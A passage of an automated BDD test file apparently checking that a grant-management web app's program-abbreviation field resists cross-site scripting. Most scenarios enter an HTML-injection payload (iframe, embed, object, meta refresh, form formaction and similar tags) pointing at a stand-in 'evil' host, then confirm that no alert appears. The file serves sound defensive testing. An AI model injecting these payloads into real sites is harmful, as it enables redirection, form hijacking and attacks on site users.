      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script8} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301592 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | <link rel=stylesheet href="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301593 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                        | Field                |
      | <link rel=icon href="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301595 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | <meta http-equiv="refresh" content="0; http://evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301597 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                  | Field                |
      | <img src="//evil?  <image src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301598 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | <video><track default src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301599 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                       | Field                |
      | <video><source src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301600 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                       | Field                |
      | <audio><source src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301601 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | <input type=image src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301603 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                        | Field                |
      | <form><button style="width:100%;height:100%" type=submit formaction="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301604 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                               | Field                |
      | <form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301608 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                     | Field                |
      | <button form=x style="width:100%;height:100%;"><form id=x action="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301609 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                 | Field                |
      | <object data="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301610 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                | Field                |
      | <iframe src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301611 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value               | Field                |
      | <embed src="//evil? | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301613 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                         | Field                |
      | <form><button formaction=//evil>XSS</button><textarea name=x> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301615 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                        | Field                |
      | <button form=x>XSS</button><form id=x action=//evil target=' | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301616 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                        | Field                |
